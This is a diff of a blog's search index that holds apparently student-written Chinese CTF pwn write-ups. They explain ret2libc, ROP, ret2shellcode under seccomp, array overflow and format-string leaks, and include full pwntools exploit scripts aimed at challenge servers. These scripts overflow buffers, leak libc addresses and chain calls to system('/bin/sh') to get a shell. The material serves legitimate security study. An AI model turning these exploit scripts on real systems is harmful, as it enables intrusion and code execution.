-然后看了几个师傅的博客，在打这个题的时候也遇到了同样的问题，最后知道了libc版本是libc6_2.27-3ubuntu1.5_amd64，所以这个题先鸽了吧，如果以后还遇到这种情况我再想想办法
-ctfshow pwn52（利用栈溢出覆盖参数）
-迎面走来的flag让我如此蠢蠢欲动
-
-int __cdecl main(int argc, const char **argv, const char **envp)&#123;  setvbuf(stdout, 0, 2, 0);  logo(&amp;argc);  puts(&quot;What do you want?&quot;);  ctfshow();  return 0;&#125;
-int ctfshow()&#123;  char s[104]; // [esp+Ch] [ebp-6Ch] BYREF  gets(s);  return puts(s);&#125;
-左侧函数栏存在明显的flag函数
-char *__cdecl flag(int a1, int a2)&#123;  char *result; // eax  char s[64]; // [esp+Ch] [ebp-4Ch] BYREF  FILE *stream; // [esp+4Ch] [ebp-Ch]  stream = fopen(&quot;/ctfshow_flag&quot;, &quot;r&quot;);  if ( !stream )  &#123;    puts(&quot;/ctfshow_flag: No such file or directory.&quot;);    exit(0);  &#125;  result = fgets(s, 64, stream);  if ( a1 == 876 &amp;&amp; a2 == 877 )    result = (char *)printf(s);  return result;&#125;
-通过这个题再复习一遍32位系统下，函数的参数是从右往左入栈的即a2先入，a1后入，a2在高地址，栈结构大体如下。我们的payload覆盖方向和栈增长的方向是相反的，这不难理解
-[高地址]  a2a1  返回地址  flag  offset  [低地址]  
-
-exp如下
-from pwn import *context.log_level = &#x27;debug&#x27; #p = process(&#x27;./pwn52&#x27;) p = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28307) elf = ELF(&#x27;./pwn52&#x27;)flag_addr = elf.symbols[&#x27;flag&#x27;] a1 = 0x36ca2 = 0x36doffset = (0x6C+0x4)payload = flat([    b&#x27;A&#x27; * offset,    flag_addr,    0xdeadbeef,    a1,    a2,])p.sendline(payload)p.interactive()
-
-直接给了ctfshow_flag文件里的内容
-还没填的坑ctfshow pwn49静态编译
-ctfshow pwn51没学过C++
-ctfshow pwn53（已填）类canary爆破，先学学python再来
-]]></content>
-      <categories>
-        <category>pwn入门</category>
-      </categories>
-      <tags>
-        <tag>ret2libc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>ret2libc进阶</title>
-    <url>/posts/b2cf9080.html</url>
-    <content><![CDATA[前置知识点实际上，在之前的ret2libc题目中，我们还没有接触到ret2libc的核心，因为plt表里是存在现成的system的，但是大多数题目中，根本就没有出现或者引用过system函数，即使动态表里有system函数，程序也不会建立对应的plt表
-因此，我们必须要知道system函数的地址，即进行经典的泄露libc的操作，这对于我们对ROP链的使用要求又上了一个台阶，因此我个人认为这一块到了pwn里真正开始上难度的地方了
-在开始之前，我们必须要知道几个前置知识点，每一块想要掌握都需要费一番功夫
-延迟绑定机制我们知道，在动态链接时，我们需要从动态链接库链接外部函数，那么这个链接外部函数的过程是怎么样的呢
-实际上，程序在第一次调用某个外部函数前，程序是不知道这个函数的具体位置的，也只有在第一次调用时，它才会去找这个函数在libc里的真实地址
-每次执行 func@plt 时，程序首先执行 jmp [got.func]，即jmp到got表里对应函数的地址，接下来程序会做一个判断：
-
-如果 GOT 中记录的是跳板地址（还没有被解析），也就是ida里看到的offset func地址，则会 push index 后跳到 plt[0]，plt[0]是所有函数第一次被调用时的公共入口，从这里开始解析函数地址，plt[0]调用动态链接器ld.so，开始查找该函数在libc的真实地址，把真实地址写入GOT表，后续可以直接从got表里调用，不用再经过复杂的plt表解析函数地址
-
-
-如果 GOT 中记录的是真实函数地址（解析完成），就直接跳过去调用真实函数
-
-我们需要重点了解第一种情况，即函数第一次被调用的过程
-实际上，第一次借助plt表寻找函数的真实地址是一个相对复杂的过程，我只解释到表面的过程，底层的原理这个博主讲的很详细
-
-https://starrysky1004.github.io/2024/09/26/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/linux-yan-chi-bang-ding-ji-zhi-guo-cheng/
-
-ALSR技术
-在 Linux 系统中，栈随机化已经变成了标准行为。 它是更大的一类技术中的一种，这类技术称为地址空间布局随机化(Address-Space Layout Randomization), 或者简称 ASLR [99] 。采用 ASLR, 每次运行时程序的不同部分，包括程序代码、库代码、栈、 全局变最和堆数据，都会被加载到内存的不同区域。 这就意味着在一台机器上运行一个程序，与在其他机器上运行同样的程序，它们的地址映射大相径庭。这样才能够对抗一些形式的攻击
-
-以上出自《CSAPP》3.10.4 对抗缓冲区溢出攻击
-在现代 Linux 系统中，ASLR 通常是全局开启的
-PIE保护和ASLR技术的关系如果程序没有开启 PIE，即使 ASLR 开启，攻击者仍然可以利用固定的代码地址来构造 ROP 链（因为代码基址不变）
-只有当 PIE 和 ASLR 同时开启时，一个进程的所有关键内存区域（代码、全局数据、栈、堆、动态链接库）的地址才会全部被随机化，使得攻击者难以预测任何地址
-以下的题目PIE保护全都是关的，所以正如上所说，我们可以用基址和偏移去计算，有公式：
-
-真实地址 &#x3D; 基址 + 偏移
-
-我们一个个来看，实际上，ASLR导致了libc的基址是随机的，这就需要我们自己泄露。我们知道，got表里存放着函数的真实地址，因此，我们可以在got表找出某一个函数func1，打印其地址，就得到了该函数的真实地址
-我们需要知道，每个版本的libc库，函数地址的偏移量是固定的，换句话说，我们需要知道我们的程序调用的是哪个版本的libc库，从而知道不同函数对应的偏移量
-我们用打印出的func1的真实地址减去偏移量，就能得到libc的基址，然后加上对应函数（如system函数）的偏移，就可以得到该函数的真实地址了
-手动计算这种情况适用于题目给了libc.so.6和ld-linux-x86-64.so.2文件，目前我还没有遇到过这种题，因此暂时按下不表
-LibcSearcher的使用如果题目只给了一个ELF二进制文件，那么我们可以用LibcSearcher去查找使用的libc库
-首先讲讲它的工作原理，一般来说，libc的基址以0xf7开头
-LibcSearcher内置了大量 libc 的函数偏移数据库，它通过泄露的实际地址减去偏移反推 libc 基址，再通过不断尝试，匹配出最可能的libc，也就是0xf7开头的，如果我们泄露多个函数时，它会交叉过滤，最终锁定正确的libc版本，将该版本的libc偏移量返回给我们
-exp鉴赏因为本篇ret2libc进阶的内容非常重要，也是最常考的，为了能够快速上手并且深刻理解，我先分析一下一些比较经典的exp，我认为看的多了，写的时候就有思路了
-当然说这些还是纸上谈兵，后面实战演练时我们会在靶场打一打
-eg1：ctfwiki 基本ROP ret2libc3int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char s[100]; // [esp+1Ch] [ebp-64h] BYREF  setvbuf(stdout, 0, 2, 0);  setvbuf(stdin, 0, 1, 0);  puts(&quot;No surprise anymore, system disappeard QQ.&quot;);  printf(&quot;Can you find it !?&quot;);  gets(s);  return 0;&#125;
-exp如下：
-#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import LibcSearchersh = process(&#x27;./ret2libc3&#x27;)ret2libc3 = ELF(&#x27;./ret2libc3&#x27;)puts_plt = ret2libc3.plt[&#x27;puts&#x27;]libc_start_main_got = ret2libc3.got[&#x27;__libc_start_main&#x27;]main = ret2libc3.symbols[&#x27;main&#x27;]#__libc_start_main这个函数比较特别#使用它是因为它在所有ELF中都存在，偏移稳定，最容易唯一匹配libc#并且LibcSearcher里通常会有这个函数print(&quot;leak libc_start_main_got addr and return to main again&quot;)#开始第一阶段泄露payload = flat([b&#x27;A&#x27; * 112, puts_plt, main, libc_start_main_got])sh.sendlineafter(b&#x27;Can you find it !?&#x27;, payload)#[A填充 112字节]#return address = puts@plt#next return = main#参数 = libc_start_main@gotprint(&quot;get the related addr&quot;)libc_start_main_addr = u32(sh.recv(4))#接收泄露出的地址#接收前四个字节，u32按照小端序，打印成整数libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)#libc基址＝libc_start_main地址-libc_start_main的偏移system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)#计算system和bin/sh的实际地址print(&quot;get shell&quot;)payload = flat([b&#x27;A&#x27; * 104, system_addr, 0xdeadbeef, binsh_addr])#其实我也没看明白为什么偏移量和第一次的不一样#AI的解释是我们是通过puts ret到的main，并不是正常返回#因此少了puts 的 saved EBP + ret共8个字节sh.sendline(payload)sh.interactive()
-
-
-32位系统 无system无bin&#x2F;sh字符串eg1：ctfshow pwn45int __cdecl main(int argc, const char **argv, const char **envp)&#123;  init(&amp;argc);  logo();  puts(&quot;O.o?&quot;);  ctfshow();  write(0, &quot;Hello CTFshow!\n&quot;, 0xEu);  return 0;&#125;
-
-ssize_t ctfshow()&#123;  char buf[103]; // [esp+Dh] [ebp-6Bh] BYREF  return read(0, buf, 0xC8u);&#125;
-
-我们本地启动简单看一下，实际上程序并不复杂，输出了字符串O.o?后让我们输入
-左侧函数窗口函数不多，可以肯定是动态链接
-
-我们重点看一下我框起来的，粉色区域加粗的函数说明是从外部的libc库中调用的，这是我们重点关注对象
-
-在got表里看一下，确实是这五个函数。这里要注意我们的got表在ida里是.got.plt表，不是.plt.got表，后者没什么用
-我们用libcsearcher需要提供任意一个函数就可以了，我这里随便选一个libc_start_main_
-下面展示一下我根据ctfwiki改编的exp，无AI。每一段我之前已经解读过了，就不再解读了
-#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#x27;debug&#x27;context.binary = &#x27;./pwn&#x27;#sh = process(&#x27;./pwn&#x27;)sh = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28144)pwn = ELF(&#x27;./pwn&#x27;)puts_plt = pwn.plt[&#x27;puts&#x27;]libc_start_main_got = pwn.got[&#x27;__libc_start_main&#x27;]main = pwn.symbols[&#x27;main&#x27;]print(&quot;leak libc_start_main_got addr and return to main again&quot;)payload = flat([b&#x27;A&#x27; * (0x6B+0x4), puts_plt, main, libc_start_main_got])sh.sendlineafter(b&#x27;O.o?&#x27;, payload)print(&quot;get the related addr&quot;)libc_start_main_addr =u32(sh.recvuntil(b&#x27;\xf7&#x27;)[-4:])libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)binsh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)print(&quot;get shell&quot;)payload = flat([b&#x27;A&#x27; *(0x6B+0x4) , system_addr, 0xdeadbeef, binsh_addr])sh.sendline(payload)sh.interactive()
-
-打通后，libcsearcher匹配到了两个可能的libc版本，我们输入0或者1挨个试一下就可以了，这里用第二个版本打通了
-
-64位系统 无system无bin&#x2F;sh字符串eg2：ctfshow pwn46int __cdecl main(int argc, const char **argv, const char **envp)&#123;  init(argc, argv, envp);  logo();  puts(&quot;O.o?&quot;);  ctfshow();  write(0, &quot;Hello CTFshow!\n&quot;, 0xEuLL);  return 0;&#125;
-ssize_t ctfshow()&#123;  char buf[112]; // [rsp+0h] [rbp-70h] BYREF  return read(0, buf, 0xC8uLL);&#125;
-
-程序和上一题没什么太大区别，具体我不细贴了，我们直接看一下我的exp
-#!/usr/bin/env pythonfrom pwn import *from LibcSearcher import LibcSearchercontext.log_level = &#x27;debug&#x27;context.binary = &#x27;./pwn&#x27;#sh = process(&#x27;./pwn&#x27;)sh = remote(&#x27;pwn.challenge.ctf.show&#x27;, 28280)pwn = ELF(&#x27;./pwn&#x27;)puts_plt = pwn.plt[&#x27;puts&#x27;]libc_start_main_got = pwn.got[&#x27;__libc_start_main&#x27;]main = pwn.symbols[&#x27;main&#x27;]#以上套模板照抄offset = 0x70 + 0x8ret_addr = 0x4004fepop_rdi_addr = 0x400803#ROPgadget算一下print(&quot;leak libc_start_main_got addr and return to main again&quot;)payload = b&#x27;A&#x27; * (0x70+0x8)payload += p64(pop_rdi_addr)payload += p64(libc_start_main_got)payload += p64(puts_plt)payload += p64(main)sh.sendlineafter(b&#x27;O.o?&#x27;, payload)print(&quot;get the related addr&quot;)libc_start_main_addr =u64(sh.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))#注意接收libc地址的方式不同libc = LibcSearcher(&#x27;__libc_start_main&#x27;, libc_start_main_addr)libcbase = libc_start_main_addr - libc.dump(&#x27;__libc_start_main&#x27;)system_addr = libcbase + libc.dump(&#x27;system&#x27;)bin_sh_addr = libcbase + libc.dump(&#x27;str_bin_sh&#x27;)#以上计算过程套模板照抄print(&quot;get shell&quot;)payload = b&#x27;a&#x27;*(0x70+0x8)payload += p64(pop_rdi_addr) #pop rdipayload += p64(bin_sh_addr) #bin/shpayload += p64(ret_addr) #retpayload += p64(system_addr) #systemsh.sendline(payload)sh.interactive()
-
-
-总结32位和64位exp的对比相比于32位的exp，64位的exp有如下改动：
-1.libc_start_main_addr &#x3D;u64(sh.recvuntil(b’\x7f’)[-6:].ljust(8, b’\x00’))
-2.两段payload不同
-32位payload1：调用puts，设置返回地址为main，设置puts参数为libc函数
-64位payload2：pop rdi寄存器，将libc参数放进rdi寄存器，调用puts函数，返回地址为main
-32位payload2：覆盖返回地址为system，设置system返回地址为虚假地址，设置system参数为bin&#x2F;sh
-64位payload2：pop rdi寄存器，将libc参数放入rdi寄存器，ret保证栈堆平衡，调用system函数
-结语这篇博客是我目前为用时最久的一篇，exp没有依靠也依靠不了AI编写，仅用了AI讲解基础知识点，自己做出来的时候还是挺高兴的
-可以说从这里开始，我们对ROP链的使用更上了一个台阶。可以看到，无system的题型虽然比有system的题型考的多也考的难，比如我们第一次用了两次payload。但是，这些依然离不开之前的基础，重点还是要理解32位和64位的传参方式及其区别，以及函数调用约定，栈是如何分布和增长的等。不可否认做题可以套模板，但是套模板的同时一定要做到理解背后的原理，清楚的知道自己每一步在干什么，而不是生搬硬套，这样就失去了做题的意义了
-]]></content>
-      <categories>
-        <category>pwn入门</category>
-      </categories>
-      <tags>
-        <tag>ret2libc</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>pwn前置基础大合集（更新中）</title>
-    <url>/posts/e5ae4e99.html</url>
-    <content><![CDATA[这篇博客主要是记录一下pwn的底层知识，主要知识来来自CSAPP，维基百科，b站网课等
-操作系统1.发展历史1969 UNIX系统 肯尼斯·蓝·汤普森&amp;丹尼斯·麦卡利斯泰尔·里奇奠定了现代操作系统，“一切皆文件”
-1984 ios mac 苹果操作系统1985 window1.01991 linux 开源免费
-2.LINUX下计算机的控制流程用户——应用软件——操作系统——驱动程序——硬件，从左到右逐层调用，其中操作系统包括系统软件和系统内核，内核负责管理它负责直接管理系统的进程、内存、设备驱动程序、文件和网络系统
-这里我还是觉得CSAPP讲的非常好，于是结合CSAPP讲一下
-刚才讲了，计算机的控制是逐层调用的，所以可以把操作系统看作是是应用程序和硬件之间的一层软件，应用程序必须通过操作系统访问处理器，主存，I&#x2F;O设备等硬件
-因此，操作系统的两大功能是确保上层的应用软件既能控制，又不滥用下层的硬件
-操作系统通过进程、虚拟内存和文件来实现两大功能
-进程 
-虚拟内存 见CSAPP第二章
-文件 权限的体现：可读可写可执行 可读可写不可执行 可读不可写不可执行
-]]></content>
-      <categories>
-        <category>pwn入门</category>
-      </categories>
-  </entry>
-  <entry>
     <title>ret2text小tips</title>
     <url>/posts/1111.html</url>
     <content><![CDATA[exp模板
@@ -498,65 +453,60 @@ from pwn import *io = remote(&quot;39.106.48.123&quot;, 29826)payload = b&quot;A
       </tags>
   </entry>
   <entry>
-    <title>初识32位下的ret2libc</title>
-    <url>/posts/b342ee9.html</url>
-    <content><![CDATA[从ret2libc开始，我们将不再局限于像ret2text那样的栈溢出了，而是要开始接触另一个技术————ROP技术。什么是ROP技术我此前详细写了博客，在此不再赘述。
-ret2libc就是拿程序里已有的函数库做文章，可以ret到的plt表，或或者ret到函数实际放置的got表处
-egctfshow pwn入门39&amp;41这两个题思路是一样的，区别是39有bin&#x2F;sh，41有sh
-首先这个题是存在明显栈溢出的，而system和sh是有但是不在一起的
+    <title>写源代码一定要crtl+s保存啊啊啊啊啊</title>
+    <url>/posts/d4f00467.html</url>
+    <content><![CDATA[今天想在css里加点东西，但是每次都是原来的样子，搞了一晚上都不行，一直是原来的样子，发现是自己改完后没有保存
+看一下左下角的时间，如果是now那就证明保存了
+另外，如果hexo d上传失败，可以按f12在网页里改一下，重新hexo d一下就可以了，实在不行，多等一小儿就可以了
+最后，感谢我磊哥再一次救我
+]]></content>
+      <categories>
+        <category>碎碎念</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>ret2shellcode与沙箱</title>
+    <url>/posts/d9295e2f.html</url>
+    <content><![CDATA[这一块的题难度上升的有点快，已经涉及到基本的汇编知识了，并且明显看出来在为接下来的ret2syscall做铺垫，exp也是不好理解，接下来进行详细的讲解
+沙箱seccomp函数，它会阻止进程的一部分系统调用，比如我们的execve，这种情况下我们无法直接拿到shell，只能去通过orw，即open-read-write去读出flag文件
 
+seccomp-tools dump .&#x2F;pwn
 
-from pwn import *context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#io = remote(&#x27;pwn.challenge.ctf.show&#x27;,28119)io = process(&quot;./pwn43&quot;)gdb.attach(io,&#x27;&#x27;&#x27;break *0x08048420           break *0x08048450&#x27;&#x27;&#x27;)buf2 = 0x0804B060system = 0x08048450gets = 0x08048420payload= b&#x27;A&#x27;*(0x6c+0x4)payload += p32(gets)payload += p32(system)payload += p32(buf2)payload += p32(buf2)io.sendline(payload)io.sendline(b&quot;/bin/sh&quot;)io.interactive()
-整个流程如下：
-1.函数返回，执行 ret → 跳到 gets
-2.gets(buf2) 读取我们下一次 sendline 的 “&#x2F;bin&#x2F;sh”
-3.gets 执行完后 ret → 跳到 system
-4.system(buf2) → 执行 &#x2F;bin&#x2F;sh，获得 shell
-让chatgpt帮忙画了一个栈图
+我们可以通过上述指令查看允许的系统调用
+pwntools的前置语法基础我们需要一些pwntools的语法，不过这并不算难
 
+asm(code, vma&#x3D;0, extract&#x3D;True, arch&#x3D;None, os&#x3D;None)
 
+后面三个不用管，我们重点看前两个
+code是必填的，它包含汇编指令的字符串vms是虚拟内存地址，是指定代码被编译时所处的起始地址
 
-地址
-内容
-含义
+asm(shellcraft.你要调用的函数)
 
+shellcraft不仅可以帮助我们生成shellcode的汇编，还可以帮我们生成某个函数的汇编代码，这样就不需要我们自己生成了
+如果我们需要写连续的汇编指令，可以用分分号连接
+eg：ctfshow pwn69__int64 __fastcall main(int a1, char **a2, char **a3)&#123;  mmap((void *)0x123000, 0x1000uLL, 6, 34, -1, 0LL);  sub_400949();  sub_400906();  sub_400A16();  return 0LL;&#125;
 
+__int64 sub_400949()&#123;  __int64 v1; // [rsp+8h] [rbp-8h]  v1 = seccomp_init(0LL);  seccomp_rule_add(v1, 2147418112LL, 0LL, 0LL);  seccomp_rule_add(v1, 2147418112LL, 1LL, 0LL);  seccomp_rule_add(v1, 2147418112LL, 2LL, 0LL);  seccomp_rule_add(v1, 2147418112LL, 60LL, 0LL);  return seccomp_load(v1);&#125;
 
-ESP+12
-buf2
-system(“&#x2F;bin&#x2F;sh”) 参数
+void sub_400906()&#123;  setbuf(stdin, 0LL);  setbuf(stdout, 0LL);  setbuf(stderr, 0LL);&#125;
 
+int sub_400A16()&#123;  char buf[32]; // [rsp+0h] [rbp-20h] BYREF  puts(&quot;Now you can use ORW to do&quot;);  read(0, buf, 0x38uLL);  return puts(&quot;No you don&#x27;t understand I say!&quot;);&#125;
+第一个函数里存在沙箱，第三个函数里给了我们栈溢出的地方
+一般来说遇到read函数我们就要注意了，因为它通常会限制我们溢出的长度，本题就是只给了我们0x38的余地，这显然是不够的，但是我们注意到main函数里存在mmap函数，可以放到0x123000处
 
-ESP+8
-buf2
-gets(buf2) 参数
+沙箱只允许我们进行orw这三个函数的系统调用
+我一开始的思路和ret2syscall一样，打算先找寄存器的gadget，但是用ROPgadget尝试找了gadget发现是找不到的，所以这个题主要利用的不全是ROP技术，我们是直接在mmap分配的内存里直接写入汇编指令的，不需要费劲一个个跳转了
 
+我们不会用pop rsp，而是jmp rsp
 
-ESP+4
-system
-gets 返回后跳到这里
-
-
-ESP
-gets
-ret → gets
-
-
-
-（低地址）
-
-
-
-要特别注意的是，我们的payload并不直接执行压栈操作，而是覆盖内存，因此此我们不能用简单的先进后出来解释payload的顺序。我们必须知道，内存的写入方向是从低地址向高地址，虽然内存增长和栈增长没有必然关系，但是我们直观上可以理解为两者的方向是相反的
-在溢出中，我们只能覆盖返回地址,不能直接移动ESP。ret指令会自动让ESP上移到返回地址的位置，并读取该地址。因此，我们把gets写到返回地址处，而不是尝试让ESP指向gets
-
+0x0000000000400a01 : jmp rsp
 
 ]]></content>
       <categories>
         <category>pwn入门</category>
       </categories>
       <tags>
-        <tag>ret2libc</tag>
+        <tag>ret2shellcode</tag>
       </tags>
   </entry>
   <entry>
@@ -654,18 +604,6 @@ from pwn import *context.log_level = &#x27;debug&#x27;io = remote(&#x27;pwn.chal
       </tags>
   </entry>
   <entry>
-    <title>写源代码一定要crtl+s保存啊啊啊啊啊</title>
-    <url>/posts/d4f00467.html</url>
-    <content><![CDATA[今天想在css里加点东西，但是每次都是原来的样子，搞了一晚上都不行，一直是原来的样子，发现是自己改完后没有保存
-看一下左下角的时间，如果是now那就证明保存了
-另外，如果hexo d上传失败，可以按f12在网页里改一下，重新hexo d一下就可以了，实在不行，多等一小儿就可以了
-最后，感谢我磊哥再一次救我
-]]></content>
-      <categories>
-        <category>碎碎念</category>
-      </categories>
-  </entry>
-  <entry>
     <title>初识ROP和ret2shellcode</title>
     <url>/posts/2b89d936.html</url>
     <content><![CDATA[如果遇到NX保护，即栈堆不可执行的情况，我们shellcode将不能作为机器码被执行，那么我们就需要新的方法————ROP技术。
@@ -702,103 +640,6 @@ context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]#io = r
       </categories>
       <tags>
         <tag>ret2shellcode</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>初识gdb的使用与数组越界</title>
-    <url>/posts/fe35eb25.html</url>
-    <content><![CDATA[开始做ISCTF的真题
-girlfriend
-题目难度：简单题目描述：你能记住你女朋友的生日嘛？
-
-首先先点评一下，出题人出这个题缝合了两个关卡，把栈溢出，ret2text和数组越界全都考察了一遍，我认为出的水平非常高，符合新生赛要求
-当然这么简单的一个题我居然想了一天，也确实是见识少了
-int __cdecl main(int argc, const char **argv, const char **envp)&#123;  char buf[40]; // [rsp+0h] [rbp-30h] BYREF  char s1[8]; // [rsp+28h] [rbp-8h] BYREF  init(argc, argv, envp);  puts(&quot;welcome to isctf2024&quot;);  puts(&quot;first i need your team id&quot;);  read(0, buf, 0x30uLL);  if ( strcmp(s1, &quot;admin&quot;) )  &#123;    puts(&quot;no no no&quot;);    exit(0);  &#125;  puts(&quot;ok, go on&quot;);  vuln();  return 0;&#125;
-
-__int64 vuln()&#123;  __int64 result; // rax  _QWORD v1[5]; // [rsp+0h] [rbp-30h] BYREF  __int64 i; // [rsp+28h] [rbp-8h]  for ( i = 0LL; i &lt;= 7; ++i )  &#123;    printf(&quot;please input your %d girlfriend birthday\n&quot;, i + 1);    result = __isoc99_scanf(&quot;%ld&quot;, &amp;v1[i]);  &#125;  return result;&#125;
-
-canary保护关NX保护开PIE关  
-
-存在system和bin&#x2F;sh字符串，而且可以直接getshell
-void __fastcall amaze()&#123;  system(&quot;/bin/sh&quot;);&#125;
-结合本题是除签到以外的第一道pwn题，因此把方向定到了ret2text和栈溢出
-利用栈溢出实现任意写下面来具体分析程序
-第一关考察了利用栈溢出实现任意写，以下是第一段payload
-payload = 0x28 * b&#x27;\x00&#x27;payload += b&#x27;admin\x00\x00\x00&#x27;p.sendafter(b&#x27;team id&#x27;, payload)
-
-我们必须要通过strcmp函数关于s1和admin字符串的比较才能进入vuln函数，但是我们无法通过直接写的方式把admin字符串写到s1里，那我们就要利用栈溢出，先通过read覆盖buf，40个，即0x28个字节，然后会溢出到s1，通过栈溢出实现任意写
-需要注意的是admin后面跟了三个\x00，因为strcmp(a, b)是逐字节比较a和b，直到遇到第一个\x00才停止，\x00也是字符串结束的标志。admin为5个字节，因此我们最好补充三个\x00凑够8个字节，当然一个\x00有时候也可以
-数组越界进vuln函数开始第二关，我们需要关注的是定义了一个大小为5字节的数组v1，以及定义了局部变量i
-然后有一个循环，scanf让我们可以读进long类型的整数而尤其是v1[i]需要引起我们的注意，这里就涉及到了数组越界的知识
-关于数组越界，可以参考下面的文章
-
-https://hello-ctf.com/hc-pwn/Stack_Overflow/
-
-总之，程序给v1的内存大小只有五个字节，当我们将其改为v1[6]时，我们就可以往栈上写东西了
-我们的思路是，先一次输入5个数，比如1，1，1，1，1，第六次时输入6，为什么要输入6，是因为此时的栈大概是这样的
-[高地址]RIPRBPiv[4]v[3]v[2]v[1]v[0][低地址]  
-我们输入6后，将会把i覆盖成6，这个时候就能出现a[6]，同时循环也不会结束，（如果我们写入1，循环不会继续进行），由于i小于7，i会继续加1，这就有第七次写入的机会
-我们必须要知道，这个循环不会因为我们的输入而停止，只要i小于等于7，循环一定是会进行的，并且一定会进行8次
-
-通过gdb调试，我注意到一个很有意思的事，我明明没有覆盖到rbp，但是rbp指针指向的地址里却有个1
-
-这是没有开始覆盖前的栈，可以看到确rbp天然存了一个1，这就让我们不需要再覆盖rbp了，因此直接加上后门函数的地址即可
-from pwn import *#p=process(&quot;./girlfriend&quot;)p=remote(&quot;challenge.imxbt.cn&quot;,32331)payload=b&#x27;a&#x27;*0x28+b&#x27;admin\x00\x00\x00&#x27;p.send(payload)p.sendline(&#x27;1&#x27;)p.sendline(&#x27;1&#x27;)p.sendline(&#x27;1&#x27;)p.sendline(&#x27;1&#x27;)p.sendline(&#x27;1&#x27;)p.sendline(&#x27;6&#x27;)#理论上是需要再sendline一个padding覆盖rbp的p.sendline(str(0x40121E))p.interactive()
-
-
-]]></content>
-      <categories>
-        <category>pwn入门</category>
-      </categories>
-      <tags>
-        <tag>ret2text</tag>
-        <tag>数组越界</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>初识格式化字符串（上）</title>
-    <url>/posts/c6380b0f.html</url>
-    <content><![CDATA[深入理解格式化字符串要想理解格式化字符串的原理，我们必须要知道的一个问题是，printf调用时，它的第一个参数是什么，比如printf(&quot;%d %f\n&quot;, x, y);，它的一参是x吗？
-让我们来看看printf的声明，int printf(const char *format, ...)，没错，printf的一参是”%d %f\n”，即格式化字符串，这一点是很多同学都没有意识到的
-我们必须要深刻理解的第二个问题是，什么是格式化字符串
-
-格式化字符串是一些程序设计语言的输入&#x2F;输出库中能将字符串参数转换为另一种形式输出的函数，它通过用于把随后对应的0个或多个函数参数转换为相应的格式输出；格式化字符串中转换说明以外的其它字符原样输出。我补充一点，这里的转换说明即格式化占位符。
-
-（ps：不要因为长就不读了，反而要读得更仔细，通过学习pwn我认识到，越涉及到一个概念的本质，描述的文字就会越详细）
-通俗的说，它就是包含格式化占位符的字符串
-格式化字符串的工作原理我们平时使用printf时，格式化占位符是必须和后面的参数一一对应的，有多少个格式化占位符，就必须有多少个参数
-这里必须再说一下printf是如何调用参数的。在64位系统中，我们的参数先会按照一定的顺序被放到6个寄存器里，从第7个参数往后，参数会被放在栈里；32位系统中，参数是直接被放到栈里保存的。
-#include&lt;stdio.h&gt;int a=1;int b=2;int c=3;printf(&quot;%d %d %d&quot;,a,b,c);return 0;
-在这段程序中，我们的参数先会按顺序被放到栈空间里保存，然后，printf会从栈空间里去找对应的数据
-#include&lt;stdio.h&gt;int a=1;int b=2;int c=3;printf(&quot;%d %d %d&quot;,a,b);return 0;
-而我们去掉了参数c会发生什么呢
-结果会是：1 2 一个很奇怪的数
-因为有第三个%d的存在，printf会试图去栈或寄存器（原本c所在的位置）再取一个整数，但是显然是无法找到c的，于是就会随机地从错误的位置读取内存，就把这个奇怪的数翻了出来。这也侧面证明了printf是从栈里去寻址的
-#include&lt;stdio.h&gt;int a=1;int b=2;int c=3;printf(&quot;%d %d %p&quot;,a,b);return 0;
-
-我们把占位符改成%p，输出的结果就是c在栈上的地址
-#include&lt;stdio.h&gt;char a[]scanf(&quot;%s&quot;,&amp;)printf(a);return 0;
-更极端的情况如上
-因此，我们可以利用格式化字符串实现可读可写
-eg1：newstar2025 week2 刻在栈上的秘密
-题目内容：欢迎来到 x64 位餐厅！服务员 printf 先生有点健忘，他只能记住您菜单上的前 6 道菜 (RDI, RSI, RDX…)，再多就只能堆在摇摇晃晃的餐盘 (栈) 上了。更糟糕的是，他会把你写的菜单原封不动地大声念出来。你能设计一份别有用心的菜单，让他念着念着，就把秘密房间的密码念给你听吗？
-
-这个题没有给我们可执行文件，直接nc链接做即可
-
-我们先输入aaaa加几个%p试一下，发现没有看到41414141，这说明aaaa被当成了格式化字符串的一部分被传入了。由于题目简单，我合理推测该prntf函数只有一个参数，即偏移量为0。不过这不重要，正常题目不会这样的
-
-下面开始正式做题
-
-我们可以看到，第11个%p打印出了密码所在寄存器的地址
-
-
-总结格式化字符串漏洞的产生，就是参数和格式化占位符没有数量上的一一对应，即源代码里的格式化占位符少于参数的数量，于是我们就可以通过输入不同的格式化占位符，去打印栈空间里对应的内容
-]]></content>
-      <categories>
-        <category>pwn入门</category>
-      </categories>
-      <tags>
-        <tag>格式化字符串</tag>
       </tags>
   </entry>
   <entry>
@@ -854,19 +695,50 @@ from pwn import * context(arch = &#x27;i386&#x27;,os = &#x27;linux&#x27;,log_lev
       </tags>
   </entry>
   <entry>
-    <title>用gdb的动态视角看ret2text的实现</title>
-    <url>/posts/2ee84d32.html</url>
-    <content><![CDATA[来看一道非常简单的栈溢出
+    <title>初识gdb的使用与数组越界</title>
+    <url>/posts/fe35eb25.html</url>
+    <content><![CDATA[开始做ISCTF的真题
+girlfriend
+题目难度：简单题目描述：你能记住你女朋友的生日嘛？
 
-后门函数地址ida里很明显，0x8048521
